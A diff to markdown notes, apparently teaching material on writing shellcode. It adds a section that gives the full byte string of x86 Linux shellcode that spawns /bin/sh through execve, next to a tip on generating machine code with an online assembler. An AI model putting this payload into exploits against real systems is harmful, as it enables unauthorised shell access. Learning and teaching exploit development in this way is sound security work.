@@ -169,3 +169,11 @@ c050682f2f7368682f62696e89e3505389e131d2
 
 ### Method 2: 
 - Use [this link](https://defuse.ca/online-x86-assembler.htm) to directly generate formatted machine code. Only use ```mov```, ```push```, ```xor``` etc. commands
+
+
+### Machine code for opening a shell:
+```
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+"\xd2\x31\xc0\xb0\x0b\xcd\x80" 
+```
